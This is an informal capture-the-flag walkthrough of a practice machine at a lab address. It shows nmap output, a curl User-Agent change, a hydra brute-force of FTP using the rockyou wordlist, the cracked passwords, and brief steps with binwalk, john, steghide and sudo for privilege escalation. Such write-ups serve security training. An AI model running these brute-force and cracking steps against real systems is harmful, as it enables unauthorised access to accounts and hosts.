did the nmap scan 


	nmap -sC -sV 10.10.226.87       
	Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-07 10:55 EDT
	Nmap scan report for 10.10.226.87
	Host is up (0.22s latency).
	Not shown: 997 closed tcp ports (conn-refused)
	PORT   STATE SERVICE VERSION
	21/tcp open  ftp     vsftpd 3.0.3
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
	|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
	|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
	|_http-title: Annoucement
	|_http-server-header: Apache/2.4.29 (Ubuntu)
	Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 37.67 seconds


go to the HTTP server there you will get a hint that change your user-agent 

so i tried to change my user agent using curl 


	curl -A "C"  http://10.10.226.87 -L
	
tried user agent A,B and C gave me a result 
	
	Attention chris, <br><br>

	Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

	From,<br>
	Agent R 

so we got a potential user as chris so we can try to bruteforce the ftp 

	 hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.226.87 ftp
	 
got the password
 
 	crystal
	
	
	
got 3 files binwalk the files and got a zip crack the zip using john and the password is 

	alien
	
and found some interesting details  like 

	Area51 
in base64 

on further searching found that the jpg file also has some 
use steghide to decrypt that info and use the above password 

so i got the credentials for ssh 

and 

sudo -l 
and google the output 

and vola you are root now
	
	

